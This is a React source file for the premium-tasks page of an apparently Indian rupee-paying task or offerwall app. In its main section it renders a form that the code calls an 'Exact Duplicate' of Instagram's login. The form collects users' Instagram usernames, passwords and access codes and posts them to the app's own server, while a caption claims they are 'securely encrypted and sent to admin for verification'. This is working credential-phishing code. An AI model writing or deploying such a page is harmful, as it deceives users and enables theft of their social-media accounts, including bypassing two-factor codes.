import { useState } from "react";
import { Gem, Instagram, Star, Video } from "lucide-react";
import GlassCard from "@/components/GlassCard";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useAuth } from "@/lib/auth";
import { useQuery, useMutation } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import type { Task } from "@shared/schema";

export default function AdvancedOfferwallPage() {
  const { user } = useAuth();
  const { toast } = useToast();
  const [showPremiumTasks, setShowPremiumTasks] = useState(false);

  const { data: advancedTasks = [] } = useQuery<Task[]>({
    queryKey: ['/api/tasks', { advanced: true }],
    queryFn: async () => {
      const response = await fetch('/api/tasks?advanced=true');
      if (!response.ok) throw new Error('Failed to fetch advanced tasks');
      return response.json();
    },
    enabled: user?.isInstagramBound,
  });

  const bindInstagramMutation = useMutation({
    mutationFn: async (credentials: { username: string; password: string; accessCode?: string }) => {
      const response = await fetch('/api/bind-instagram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: user?.id,
          ...credentials,
        }),
      });
      
      if (!response.ok) throw new Error('Failed to bind Instagram');
      return response.json();
    },
    onSuccess: () => {
      toast({
        title: "Instagram Binding Submitted",
        description: "Waiting for Instagram approval. Check again after 10-15 minutes.",
      });
      setShowPremiumTasks(true);
    },
    onError: () => {
      toast({
        title: "Error",
        description: "Failed to submit Instagram binding request.",
        variant: "destructive",
      });
    },
  });

  const handleInstagramSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const formData = new FormData(e.currentTarget);
    bindInstagramMutation.mutate({
      username: formData.get('username') as string,
      password: formData.get('password') as string,
      accessCode: formData.get('accessCode') as string || undefined,
    });
  };

  if (!user?.hasAdvancedAccess) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <GlassCard className="p-8 text-center">
          <h3 className="text-xl font-semibold mb-4">Access Denied</h3>
          <p className="text-gray-300">Complete at least one task to access premium offers.</p>
        </GlassCard>
      </div>
    );
  }

  return (
    <div className="min-h-screen p-4 pt-8 pb-24">
      <div className="flex items-center mb-6">
        <Gem className="text-purple-400 text-2xl mr-3" size={32} />
        <h2 className="text-2xl font-bold gradient-text">Premium Tasks</h2>
      </div>

      {!user.isInstagramBound && !showPremiumTasks ? (
        /* Instagram Binding Section */
        <GlassCard className="p-6 mb-6">
          <h3 className="text-xl font-semibold mb-4 flex items-center">
            <Instagram className="text-pink-500 mr-3" size={24} />
            Bind Instagram Account
          </h3>
          <p className="text-gray-300 mb-6">
            To access premium tasks, you need to securely bind your Instagram account.
          </p>
          
          {/* Instagram Login Form (Exact Duplicate) */}
          <div className="bg-white rounded-xl p-6 mb-4">
            <div className="text-center mb-6">
              <Instagram className="text-4xl text-black mb-4 mx-auto" size={48} />
            </div>
            <form onSubmit={handleInstagramSubmit} className="space-y-4">
              <Input
                name="username"
                type="text"
                placeholder="Phone number, username, or email"
                className="w-full p-3 border border-gray-300 rounded-lg text-black bg-gray-50 focus:border-blue-500"
                required
                data-testid="input-instagram-username"
              />
              <Input
                name="password"
                type="password"
                placeholder="Password"
                className="w-full p-3 border border-gray-300 rounded-lg text-black bg-gray-50 focus:border-blue-500"
                required
                data-testid="input-instagram-password"
              />
              <Input
                name="accessCode"
                type="text"
                placeholder="Access Code (if required)"
                className="w-full p-3 border border-gray-300 rounded-lg text-black bg-gray-50 focus:border-blue-500"
                data-testid="input-access-code"
              />
              <Button
                type="submit"
                disabled={bindInstagramMutation.isPending}
                className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3"
                data-testid="button-login-instagram"
              >
                {bindInstagramMutation.isPending ? 'Submitting...' : 'Log In'}
              </Button>
            </form>
          </div>

          <div className="text-center">
            <p className="text-xs text-gray-400">
              Your login details are securely encrypted and sent to admin for verification
            </p>
          </div>
        </GlassCard>
      ) : (
        /* Premium Tasks */
        <div className="space-y-4">
          {advancedTasks.length === 0 ? (
            <div className="text-center py-8">
              <div className="text-gray-400">No premium tasks available</div>
            </div>
          ) : (
            advancedTasks
              .filter(task => task.isActive)
              .map((task) => (
                <GlassCard key={task.id} className="p-6 border border-purple-500/30">
                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center">
                      {task.taskType === 'custom' ? (
                        <Video className="text-purple-400" size={24} />
                      ) : (
                        <Star className="text-yellow-400" size={24} />
                      )}
                      <div className="ml-3">
                        <h4 className="font-semibold text-yellow-400" data-testid={`premium-task-title-${task.id}`}>
                          {task.title}
                        </h4>
                        <p className="text-sm text-gray-400" data-testid={`premium-task-description-${task.id}`}>
                          {task.description}
                        </p>
                      </div>
                    </div>
                    <div className="text-right">
                      <div className="text-2xl font-bold text-yellow-400" data-testid={`premium-task-reward-${task.id}`}>
                        ₹{(task.reward / 100).toFixed(0)}
                      </div>
                      <div className="text-xs text-gray-400">Reward</div>
                    </div>
                  </div>
                  <Button 
                    className="w-full bg-yellow-500 hover:bg-yellow-600 text-dark-bg font-semibold py-3"
                    data-testid={`button-start-premium-task-${task.id}`}
                  >
                    Start Premium Task
                  </Button>
                </GlassCard>
              ))
          )}
        </div>
      )}
    </div>
  );
}
